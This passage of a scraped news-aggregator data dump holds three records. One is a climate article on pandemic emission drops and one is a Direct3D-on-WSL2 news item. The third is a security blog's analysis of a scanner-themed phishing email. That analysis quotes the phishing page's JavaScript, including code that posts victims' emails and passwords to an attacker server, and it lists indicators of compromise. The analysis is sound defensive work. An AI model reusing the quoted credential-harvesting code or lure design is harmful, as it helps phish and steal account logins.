Quéré说，科学家们确实估计，在此期间，居民楼的排放量增加了2.8%，可能是因为人们在家工作，在家庭中消耗更多的电力。她补充说，如果大流行持续到夏季，美国和北半球其他地区的家庭增加空调使用量，这种涨幅可能会增加。\n尽管在大流行的背景下，排放量的下降带来了意想不到的好消息，但这些减排是以高昂的社会成本为代价的。一旦取消对人们行动和日常生活的限制，这些变化也不太可能持续下去。虽然这些下降在现代历史上基本上是无与伦比的，但它们也表明了大幅减少全球排放量是多么困难。\n豪斯帕德说：“尽管世界各地都在改变我们的生活方式和消费行为，但我们今年只会看到7%的降幅。”“这表明了脱碳到底是一个多么巨大的挑战。”\n在大流行之前，全球二氧化碳排放量在过去十年中一直在以每年约1%的速度增长。一年的排放量下降是有意义的，但这不足以减缓气候变化的加速步伐。\n豪斯帕德说：“二氧化碳会在大气中停留很长一段时间，所以气候变化更多地是由我们曾经排放的总量推动的，而不是我们在一年中排放的任何数量。”“从气候的角度来看，真正重要的是能够在几十年内推动排放量下降的长期系统性变化。”\n从4%到7%的降幅与2015年巴黎气候协议规定的将全球变暖控制在1.5摄氏度至2摄氏度以下所需的全球排放量大致一致。\n豪斯帕德说：“在接下来的十年里，我们必须保持2020年每年的减排速度。”\n但Le Quéré表示，她希望这项研究的发现将鼓励各国思考在不牺牲气候行动的情况下促进经济复苏的解决方案。\n“我们正处在十字路口，”她说。“这关系到政府的远见和前瞻性。我们明天需要建设什么样的社会才能降低更多灾难的风险？“\n杰克逊说，有理由乐观，因为冠状病毒大流行带来的一些环境变化很容易看到或感觉到。\n“最明显的变化是从印度到印第安纳州我们看到的美丽的蓝天，”他说。“除了关于温室气体排放的抽象讨论之外，人们还可以对此产生更多的共鸣--你可以看到天空是晴朗的。”\n丹尼斯·周(Denise Chow)是美国国家广播公司新闻科学频道(NBC News Science)专注于环境和空间的记者。", "note_en": "Get breaking news alerts and special reports. The news and stories that matter, delivered weekday mornings.\n SUBSCRIBE\n  The coronavirus pandemic has forced countries around the world to enact strict lockdowns, seal borders and scale back economic activities. Now, an analysis published Tuesday finds that these measures contributed to an estimated 17 percent decline in daily global carbon dioxide emissions compared to daily global averages from 2019.\n    At the height of coronavirus confinements in early April, daily carbon dioxide emissions around the world decreased by roughly 18.7 million tons compared to average daily emissions last year, falling to levels that were last observed in 2006, according to the new study, published in the  journal Nature Climate Change.\n Drastic changes in transportation, industrial activities and air travel in nations under lockdowns could also fuel a decrease in this year’s annual carbon emissions of up to 7 percent, the study found. Though significant, scientists say these declines are  unlikely to have a long-term impact once countries return to normal unless governments prioritize investments and infrastructure to reduce harmful emissions.\n “Globally, we haven’t seen a drop this big ever, and at the yearly level, you would have to go back to World War II to see such a big drop in emissions,” said Corinne Le Quéré, a professor of climate change science at the University of East Anglia in the U.K., and the study’s lead author. “But this is not the way to tackle climate change — it’s not going to happen by forcing behavior changes on people. We need to tackle it by helping people move to more sustainable ways of living.”\n  The study found that the sharpest decline in carbon emissions — making up 43 percent of the total decrease — came from reduced traffic from cars, buses and trucks. Emissions from industrial activities, which were ramped down substantially in the hardest-hit nations, fell by 19 percent.\n  Emissions from air travel, which experienced a staggering 75 percent drop in daily activity in early April, fell by 60 percent. That decline, however, made up a much smaller portion of the overall decrease because air travel typically accounts for only 2.8 percent of yearly global carbon emissions.\n Let our news meet your inbox. The news and stories that matters, delivered weekday mornings.\n “Air traffic was down two-thirds, but surface transport — cars and trucks — is almost 10 times bigger in terms of emissions,” said Rob Jackson, a professor of Earth system science at Stanford University and a co-author of the study.\n  The pandemic will likely also cause this year’s annual carbon emissions to drop by between 4 percent to 7 percent, depending on how long strict social-distancing measures remain in effect and how quickly economies rebound.\n  In early April, the deepest decreases in daily global carbon emissions — 17 percent declines compared to daily averages last year — lasted for about two weeks, according to Jackson. Individual countries saw an average drop in emissions of 26 percent at the peak of their lockdowns, which occurred earlier for several countries in Asia, where the coronavirus emerged in late December, and more recently for parts of Europe and North America.\n The study did not account for how global emissions could be affected by new outbreaks and subsequent wave of infections, but it’s likely that such events could lead to steeper declines in emissions this year and possibly into 2021.\n “If the outbreak lasts longer, we’ll have more depressed economic activity in 2021,” said Zeke Hausfather, a climate scientist at the University of California, Berkeley, who was not involved with the new study. “It’s likely at this point that 2021 emissions will be below 2019 emissions but higher than 2020, unless things take a turn for the worse.”\n In the new analysis, the researchers examined lockdown measures in 69 countries that are responsible for 97 percent of global carbon dioxide emissions. Since there is no way to measure carbon dioxide emissions in real time, the scientists used data on how six key economic sectors, including industrial activities, ground transportation and air travel, were affected in each country from January through April. They then calculated how emissions in these sectors, and their contribution to yearly emissions, changed based on the severity of each nation’s social-distancing restrictions.\n  The scientists did estimate a 2.8 percent increase in emissions from residential buildings during this time, likely from people working from home and consuming more electricity in households, Le Quéré said. It’s possible, she added, that this bump could increase if the pandemic lingers through the summer and homes in the U.S. and elsewhere in the Northern Hemisphere ramp up use of air conditioning.\n  Though  declining emissions make for unexpected good news against the backdrop of the pandemic, these reductions have come at a high societal cost. The changes are also unlikely to last once restrictions on people’s movements and daily lives are lifted. And though these declines are largely unparalleled in modern history, they also demonstrate how difficult it is to make significant dents in global emissions.\n “Despite all of the changes that are happening around the world to our lifestyle and consumption behaviors, we’re only going to see a reduction of 7 percent this year,” Hausfather said. “It goes to show just how big a challenge decarbonization really is.”\n Before the pandemic, global carbon dioxide emissions had been increasing by approximately 1 percent a year over the past decade. A drop in emissions in one year is something, but it’s not enough to slow the accelerated pace of climate change.\n “Carbon dioxide stays in the atmosphere for a very long time, so climate change is driven more by the total amount we’ve ever emitted than any amount we emit in a single year,” Hausfather said. “From a climate standpoint, what really matters is long-term systemic changes that can drive emission declines over decades.”\n  Decreases from 4 percent to 7 percent are roughly in line with how much global emissions would need to fall each year to keep global warming below 1.5 degrees to 2 degrees Celsius, as outlined under the 2015 Paris climate agreement.\n “We would have to have the same speed of reduction that’s happening in 2020 every year for the next decade,” Hausfather said.\n But Le Quéré said she hopes the study’s findings will encourage countries to think about solutions that promote economic recovery without sacrificing climate action.\n “We’re at a crossroads,” she said. “It’s about governments having vision and being forward thinking. What society do we need to build tomorrow to reduce the risks of more disasters?”\n  There is cause to be optimistic, Jackson said, because some of the environmental changes from the coronavirus pandemic could be readily seen or felt.\n “The most obvious change was the beautiful blue skies we saw from India to Indiana,” he said. “People can relate to that more than abstract discussions about greenhouse gas emissions — you could just see that skies were clear.”\n Denise Chow is a reporter for NBC News Science focused on the environment and space.", "posttime": "2020-05-20 04:13:48", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "冠状病毒,coronavirus,病毒,排放,emissions", "title": "在冠状病毒期间，全球碳排放下降了17%", "title_en": "Carbon Emissions Dropped 17 Percent Globally Amid Coronavirus", "transed": 1, "url": "https://www.nbcnews.com/science/environment/carbon-emissions-dropped-17-percent-globally-amid-coronavirus-n1210331", "via": "", "real_tags": ["冠状病毒", "病毒", "排放", "emissions"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002868, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "十年来的大部分时间里，恶意攻击者一直在利用扫描仪和复印机等文档处理办公设备的“扫描到电子邮件”功能作为诱饵，以说服目标用户在他们的机器上安装恶意软件。然而，最近我们注意到员工收到的电子邮件使用了类似的诱饵，但意图不是恶意软件安装，而是帐户凭据网络钓鱼(针对Microsoft Live帐户)，这说明此特定攻击媒介已从恶意软件有效负载演变为泄露帐户凭据。电子邮件诱饵最近，工作人员收到一封电子邮件，告诉他们已经准备好了一份扫描文件，据称扫描工作是在位于“前台”的“The Intercept DocuCentre-SCANFX-2EFF73”扫描仪上完成的。这封电子邮件包括一个HTM文件作为附件，并声称来自“the intercept Sharepoint Scanner”。发件人名称“the intercept Sharepoint Scanner”试图利用各种扫描仪的功能将文档发送到Microsoft SharePoint库。在钓鱼邮件中被恶搞的施乐(Xerox)品牌就有这样的功能。这个阶段的一个小危险信号是SharePoint已经被错误地定义为“Sharepoint”，并且邮件包含不规则的大小写(“A New File is scanned to you”)。仔细查看发件人字段会发现，该电子邮件不是来自公司内部电子邮件，而是来自no-reply-exchangelab-apcprd01.documentation.protection.ocbc35853@phumaianh-vn[.]com.。长达64个字符的用户名似乎是为了混淆域名与电子邮件声称来自的公司域名不匹配(在我们的案例中，电子邮件声称来自The Intercept)。查看有效负载HTM文件的页面源代码的网络钓鱼有效负载显示，网络钓鱼页面通过对源代码中的多个字符使用百分比编码来部署基本的模糊处理。取消转义代码会揭示人类可读的页面源代码，因为网络钓鱼者没有使用进一步的模糊处理技术。如果用户打开HTM文件，则会在模糊的文档背景上显示登录提示。模糊的文档背景似乎设计为Adobe Acrobat的模糊表示，并放置登录覆盖以使用户认为文档将在他们登录后显示。模糊的背景图像通过以下代码加载：<div>位于未受保护的../xero/目录中的其他可疑文件的存在表示ForexliteOption[.]com域可能已被攻击者破坏，以促进其网络钓鱼活动。在网络钓鱼登录页面上还有一些更值得注意的次要事件。第一个是为用户预填电子邮件地址。这对恶意HTM文件的每个实例的网络钓鱼者都是唯一的，以及促进网络钓鱼页面的额外自动定制有额外的好处。登录提示符的顶部装饰有目标组织的徽标，而登录提示符的标题包括组织的名称(虽然空格不正确)。这些自定义效果通过以下代码实现：var email=$(“#email”).val()；console.log(Email)；var domain=email.substring(email.lastIndexOf(“@”)+1)；var frmsite=domain.substring(0，domain.lastIndexOf(“.”))；Document.getElementById(“fieldImg”).src=`https://api.statvoo.com/favicon/?url=${domain}`；document.getElementById(“head-message”).innerHTML=`${ucFirst(Frmsite)}安全文档`钓鱼页面使用预先填写的电子邮件解析域名，然后使用域名填充‘.。安全文档的标题字段，并从域获取收藏夹图标并将其插入登录提示的顶部。钓鱼页面使用的StatvooAPI(反过来调用https://www.google.com/s2/favicons?sz=64&domain_url=)来获取收藏图标)。具有讽刺意味的是，Statvoo提供网站评论和统计数据，其设计初衷是“避免网络诈骗和不安全的网站”。如果用户输入密码并按下Login按钮，按钮将更改为“Verifing”(屈从于基本拼写错误的常见网络钓鱼红旗)。网络钓鱼页面然后将用户凭证传递到第三方站点：{$.ajax({DataType：‘JSON’，URL：‘https://server.bossthraed.com/kelval.php’，TYPE：‘POST’，数据：{Email：Email，Password：Password，Detail：Detail，}然后，位于Bossthraed[.].com上的PHP脚本提供给定的信号响应。如果收到的响应为no-auth，表示凭据无效，则网络钓鱼页面会显示一条消息，指出凭据不正确(t", "note_en": "Malicious actors have been leveraging the 'scan to email' functionality of document-handling office equipment like scanners and copiers for the better part of a decade as bait to convince targeted users to install malware on their machines. Recently however, we have noticed staff receive emails which use a similar bait but with the intention being not malware installation but account credential phishing (targeting Microsoft Live accounts), illustrating that this particular attack vector has evolved from malware payloads to compromising account credentials.  The Email Bait Recently, staff received an email letting them know that they have had a scanned document ready, with the scan purportedly being done on the 'Theintercept DocuCentre-SCANFX-2EFF73' scanner, located at the 'Frontdesk'. The email includes an HTM file as an attachment, and claims to have come from 'Theintercept Sharepoint Scanner'.  The sender name, 'Theintercept Sharepoint Scanner' attempts to leverage the capability of various scanners to send documents to a Microsoft SharePoint library. Xerox, the brand being spoofed in the phishing email, has precisely such a feature. A small red flag at this stage is that SharePoint has been misstylized as 'Sharepoint' and that the message contains irregular capitalization (\"A New File was Scanned to you\").  Taking a closer look at the From field reveals that the email came not from an internal company email but from no-reply-exchangelab-apcprd01.documentation.protection.ocbc35853@phumaianh-vn[.]com. The long, 64 character username seems designed to obfuscate that the domain name does not match the company domain that the email claims to be from (in our case, the email is claiming to come from The Intercept).  The Phishing Payload Viewing the page source of the payload HTM file reveals that the phishing page deploys rudimentary obfuscation by using percent-encoding for multiple characters in the source code.  Unescaping the code reveals the human-readable page source, as no further obfuscation techniques were used by the phisher. If the user opens the HTM file, they are presented with a login prompt atop a blurred document background. The blurred document background appears designed to be a blurred representation of Adobe Acrobat, with the  login overlay placed to make the user think the document will appear after they login.  The blurred background image is loaded via the following code: <div class=\"row\" style=\"background-image: url('https://app.forexliteoptions.com/core/database/xero/images/8.jpg'); background-size: cover;background-repeat: no-repeat;\"> The presence of other suspect files located in the unprotected ../xero/ directory indicates that the forexliteoption[.]com domain may have been compromised by the attacker to facilitate their phishing campaigns.  There are a number of further notable minor flourishes on the phishing login page. The first is that the email address is prefilled for the user. This has the added benefit for the phisher of every instance of the malicious HTM file being unique, as well as fostering additional automatic customization of the phishing page. The top of the login prompt is adorned with the target organization's logo, while the title of the login prompt includes the organization's name (though with incorrect spacing). These customization effects are achieved via the following code:   var email=$(\"#email\").val();   console.log(email);   var domain = email.substring(email.lastIndexOf(\"@\") +1);   var frmsite = domain.substring(0, domain.lastIndexOf(\".\"));   document.getElementById(\"fieldImg\").src = `https://api.statvoo.com/favicon/?url=${domain}`;   document.getElementById(\"head-message\").innerHTML = `${ucFirst(frmsite)} Secured Document` The phishing page uses the prefilled in email to parse the domain, and then uses the domain to populate the '... Secured Document' title field as well as to fetch the favicon from the domain and insert it into the top of the login prompt. The phishing page uses's Statvoo's API (which in turn makes a call to https://www.google.com/s2/favicons?sz=64&domain_url=) to fetch the favicon. Ironically, Statvoo, which provides website reviews and statistics, is designed to \"Avoid online scams and unsafe websites\".  If the user enters their password and presses the Login button, the button changes to say that it is 'Verifing' (succumbing to the common phishing red flag of basic misspelling). The phishing page then passes on the user credentials to a third-party site:        {          $.ajax({           dataType: 'JSON',           url: 'https://server.bossthraed.com/kelval.php',           type: 'POST',           data:{             email:email,             password:password,             detail:detail,            } The PHP script located on bossthraed[.]com then provides a given signal response. If the response received is no-auth, meaning that the credentials are invalid, the phishing page displays a message that the credentials are incorrect (the exact message wording is relayed from the PHP script, not hardcoded into the phishing page), prompting the user to enter them again. This represents a relative sophistication of the phishing campaign — the attacker's script is able to test the legitimacy of the user credentials in real-time, and to then only harvest working credentials.  If, however, the phishing page receives the success signal meaning that the attacker's script has determined that the entered credentials are valid, the phishing page then appears to redirect to a PDF file hosted on Microsoft OneDrive.                 if(response['signal'] == 'success'){                  $('#msg').html(response['msg']);                  $(\"#msg\").show();                  $('#msg').addClass( 'alert-success' );                  $(\".modal-header\").addClass('hide');                  setTimeout('window.location.href=\\x27https://onedrive.live.com/redir?resid227BFC55B5&ithint&authkey=!AEPvKF_OtOAaCH0==file,pdfE87969!134&e=GXnFAo\\x27;', 0x5dc);                                   } The OneDrive link is no longer valid, now returning a \"This item might not exist or is no longer available\" response, and so we are unable to go any further in the campaign and see what the document actually was — if the document link was ever working in the first place.  Summary of Findings The phishing campaign attempts to leverage the 'scan to email' functionality of modern office document-handling equipment as the bait text to lure users into opening an attachment which contains a credential-harvesting phishing page.  The phishing page employs basic customization via inserting the target domain into the title of the login page as well as using the target domain's favicon.  A script hosted on another domain checks the validity of the inputted credentials in real-time, and redirects the user to a document only upon entry of valid credentials, otherwise displaying an 'incorrect password' error.  Indicators of Compromise (IOCs) Documents Filename: theintercept-Scanned.htm SHA256 Checksum: d19c858559435cc2d4ef11c00afe06ccf5d54a73b8c6fd6c6be5aa72f88a16ff Note: As the phishing HTM file comes prefilled with the target's email, each document will be unique.  Domains bossthraed[.]com (The domain which receives the harvested user login credentials) forexliteoptions[.]com (The domain used to store images and other files for the phishing campaign) onedrive.live[.]com/redir?resid227BFC55B5&ithint&authkey=!AEPvKF_OtOAaCH0==file,pdfE87969!134&e=GXnFAo (The file that the user is finally redirected to upon entering valid credentials on the phishing site) phumaianh-vn[.]com (The domain used to send the bait email) ", "posttime": "2020-05-20 04:12:32", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "扫描仪,scanner,电子邮件", "title": "当您的Office扫描仪设置为网络钓鱼框架时", "title_en": "When Your Office Scanner Is Framed for Phishing", "transed": 1, "url": "https://tech.firstlook.media/when-your-office-scanner-is-framed-for-phishing", "via": "", "real_tags": ["扫描仪", "scanner", "电子邮件"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002867, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "作为在今天的虚拟构建大会上宣布的将GPU加速引入WSL2的一部分，微软刚刚发表了一篇博客文章，其中包含了更多细节，包括他们在Linux上移植Direct3D12。这项针对Linux的DirectX工作的一部分涉及一个新的Linux内核驱动程序，用于通过WSL2设置将DirectX图形适配器公开给Linux用户空间。DXGKRNL驱动程序通过VM总线连接与Windows主机连接。将支持多个GPU。更有趣的工作是在用户空间与微软合作，为Linux提供真正完整的D3D12API。&#34；这是真正完整的D3D12API，这里没有模仿、伪装或重新实现…。这才是真正的交易。libd3d12.so是从与Windows上的d3d12.dll相同的源代码编译而来，只是针对Linux目标。&#34；当前的支持只允许屏幕外呈现，直到WSL2GUI支持就位。此支持还需要Windows WDDMv2.9图形驱动程序。在过于兴奋之前，针对Linux的Direct3D12库将是封闭源码的。DirectX核心和D3D12库将是封闭源代码的，并作为Windows的一部分提供。由于它针对的是DXGKRNL内核接口，这些库对于Wine/Proton等很可能没有什么价值，除非实现了一个新的层，以便可以为裸机Linux系统重新实现DXGKRNL接口。通过这种Direct3D12实现，WSL2也将支持OpenGL、OpenCL和Vulkan。你可能还记得最近微软和Collabora宣布了他们在DirectX 12上映射OpenGL和OpenCL的工作。微软也在与NVIDIA合作，在WSL2下支持CUDA。通过这篇有趣的博客帖子了解更多细节。此外，微软现在还发布了针对Linux内核的虚拟GPU驱动程序。内核驱动程序部分是开源的，最终他们会将其作为主线。此内核驱动程序仅与Windows主机/WSL2安装环境相关，并取决于Microsoft Hyper-V。", "note_en": "As part of  bringing GPU acceleration to WSL2 that was announced at today&#39;s virtual Build conference, Microsoft just published a blog post with more details including their port of Direct3D 12 for Linux.\r   Part of this DirectX work for Linux involves a new &#34;DXGKRNL&#34; Linux kernel driver for exposing the DirectX graphics adapters to the Linux user-space through the WSL2 setup. The DXGKRNL driver interfaces with the Windows host via a VM bus connection. Multiple GPUs will be supported.\r   The more interesting work is in user-space with Microsoft to provide a &#34;real and full D3D12 API&#34; for Linux. &#34; This is the real and full D3D12 API, no imitations, pretender or reimplementation here… this is the real deal. libd3d12.so is compiled from the same source code as d3d12.dll on Windows but for a Linux target.&#34;\r   The current support allows only offscreen rendering until the WSL2 GUI support is in place. This support will also require Windows WDDMv2.9 graphics drivers.\r   Before getting too excited, the Direct3D 12 library for Linux will be closed-source. The DirectX core and D3D12 libraries will be closed-source and shipped as part of Windows. With it targeting the DXGKRNL kernel interfaces, these libraries will likely be of little value to Wine / Proton and the like unless there was a new layer implemented so the DXGKRNL interfaces could be re-implemented for bare metal Linux systems.\r   Via this Direct3D 12 implementation is also how WSL2 will support OpenGL, OpenCL, and Vulkan. You may recall recently Microsoft and Collabora announced  their work to map OpenGL and OpenCL over DirectX 12.\r   Microsoft is also working with NVIDIA to support CUDA under WSL2.\r   More details via  this interesting blog post.  \rAdditionally, Microsoft also published now  their virtual GPU driver for the Linux kernel. The kernel driver portion is open-source and ultimately they will be looking to mainline it. This kernel driver is just relevant in the context of a Windows host / WSL2 setup and contingent upon Microsoft Hyper-V.", "posttime": "2020-05-20 04:12:06", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "microsoft,linux,微软,推出,announces", "title": "微软宣布推出适用于Linux/WSL2的Direct3D 12", "title_en": "Microsoft Announces Direct3D 12 for Linux / WSL2", "transed": 1, "url": "https://www.phoronix.com/scan.php?page=news_item&px=Microsoft-DX12-WSL2", "via": "", "real_tags": ["microsoft", "linux", "微软", "推出", "announces"]}]